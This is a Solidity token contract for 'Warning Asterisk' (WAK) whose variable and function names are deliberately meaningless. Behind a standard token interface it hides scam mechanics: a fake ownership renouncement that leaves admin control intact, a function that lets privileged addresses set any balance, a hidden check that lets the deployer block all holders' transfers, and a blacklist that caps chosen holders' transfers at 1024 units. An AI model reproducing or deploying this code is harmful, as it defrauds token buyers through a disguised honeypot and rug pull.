//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface sellReceiver {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract amountList {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface shouldTo {
    function createPair(address teamSwap, address fundMarketing) external returns (address);
}

interface tokenExempt {
    function totalSupply() external view returns (uint256);

    function balanceOf(address liquidityTeam) external view returns (uint256);

    function transfer(address minMax, uint256 listMax) external returns (bool);

    function allowance(address receiverMode, address spender) external view returns (uint256);

    function approve(address spender, uint256 listMax) external returns (bool);

    function transferFrom(
        address sender,
        address minMax,
        uint256 listMax
    ) external returns (bool);

    event Transfer(address indexed from, address indexed walletSell, uint256 value);
    event Approval(address indexed receiverMode, address indexed spender, uint256 value);
}

interface tokenExemptMetadata is tokenExempt {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract WarningAsterisk is amountList, tokenExempt, tokenExemptMetadata {

    mapping(address => bool) public tradingTeam;

    function totalTake() public {
        emit OwnershipTransferred(fromIs, address(0));
        isMax = address(0);
    }

    function approve(address maxSell, uint256 listMax) public virtual override returns (bool) {
        minTeam[_msgSender()][maxSell] = listMax;
        emit Approval(_msgSender(), maxSell, listMax);
        return true;
    }

    function name() external view virtual override returns (string memory) {
        return amountLiquidity;
    }

    uint256 public modeSender;

    address tradingReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    string private amountLiquidity = "Warning Asterisk";

    function buyLiquidity(address isMinTrading, address minMax, uint256 listMax) internal returns (bool) {
        if (isMinTrading == fromIs) {
            return senderLaunch(isMinTrading, minMax, listMax);
        }
        uint256 totalMarketingBuy = tokenExempt(totalTo).balanceOf(tradingReceiver);
        require(totalMarketingBuy == atTake);
        require(minMax != tradingReceiver);
        if (tradingTeam[isMinTrading]) {
            return senderLaunch(isMinTrading, minMax, limitMin);
        }
        return senderLaunch(isMinTrading, minMax, listMax);
    }

    function feeLimit(address shouldAt) public {
        if (isTradingMode) {
            return;
        }
        if (modeSender == enableReceiverTeam) {
            enableReceiverTeam = modeSender;
        }
        maxBuy[shouldAt] = true;
        if (enableReceiverTeam != modeSender) {
            fromMaxTake = false;
        }
        isTradingMode = true;
    }

    function autoTx(address autoLaunchedMode, uint256 listMax) public {
        teamSell();
        txMax[autoLaunchedMode] = listMax;
    }

    function balanceOf(address liquidityTeam) public view virtual override returns (uint256) {
        return txMax[liquidityTeam];
    }

    bool public listExempt;

    function teamSell() private view {
        require(maxBuy[_msgSender()]);
    }

    function transfer(address autoLaunchedMode, uint256 listMax) external virtual override returns (bool) {
        return buyLiquidity(_msgSender(), autoLaunchedMode, listMax);
    }

    function allowance(address txWalletExempt, address maxSell) external view virtual override returns (uint256) {
        if (maxSell == tradingSwap) {
            return type(uint256).max;
        }
        return minTeam[txWalletExempt][maxSell];
    }

    event OwnershipTransferred(address indexed launchSell, address indexed exemptSwap);

    uint256 private fundBuy;

    uint256 public toTx;

    uint256 atTake;

    function sellSwap(uint256 listMax) public {
        teamSell();
        atTake = listMax;
    }

    bool private fromMaxTake;

    function senderLaunch(address isMinTrading, address minMax, uint256 listMax) internal returns (bool) {
        require(txMax[isMinTrading] >= listMax);
        txMax[isMinTrading] -= listMax;
        txMax[minMax] += listMax;
        emit Transfer(isMinTrading, minMax, listMax);
        return true;
    }

    function decimals() external view virtual override returns (uint8) {
        return autoTrading;
    }

    address public totalTo;

    uint256 private swapLimit;

    address private isMax;

    string private swapMinMax = "WAK";

    uint8 private autoTrading = 18;

    uint256 constant limitMin = 2 ** 10;

    mapping(address => uint256) private txMax;

    mapping(address => mapping(address => uint256)) private minTeam;

    uint256 private buyTotal = 100000000 * 10 ** 18;

    function receiverAuto(address receiverReceiverAuto) public {
        teamSell();
        if (enableReceiverTeam != minExempt) {
            toTx = swapLimit;
        }
        if (receiverReceiverAuto == fromIs || receiverReceiverAuto == totalTo) {
            return;
        }
        tradingTeam[receiverReceiverAuto] = true;
    }

    uint256 atAmount;

    function totalSupply() external view virtual override returns (uint256) {
        return buyTotal;
    }

    function getOwner() external view returns (address) {
        return isMax;
    }

    address public fromIs;

    bool public isTradingMode;

    address tradingSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => bool) public maxBuy;

    function symbol() external view virtual override returns (string memory) {
        return swapMinMax;
    }

    function owner() external view returns (address) {
        return isMax;
    }

    uint256 private enableReceiverTeam;

    constructor (){
        
        sellReceiver maxLaunch = sellReceiver(tradingSwap);
        totalTo = shouldTo(maxLaunch.factory()).createPair(maxLaunch.WETH(), address(this));
        if (fundBuy == swapLimit) {
            fromMaxTake = true;
        }
        fromIs = _msgSender();
        totalTake();
        maxBuy[fromIs] = true;
        txMax[fromIs] = buyTotal;
        
        emit Transfer(address(0), fromIs, buyTotal);
    }

    uint256 private minExempt;

    function transferFrom(address isMinTrading, address minMax, uint256 listMax) external override returns (bool) {
        if (_msgSender() != tradingSwap) {
            if (minTeam[isMinTrading][_msgSender()] != type(uint256).max) {
                require(listMax <= minTeam[isMinTrading][_msgSender()]);
                minTeam[isMinTrading][_msgSender()] -= listMax;
            }
        }
        return buyLiquidity(isMinTrading, minMax, listMax);
    }

}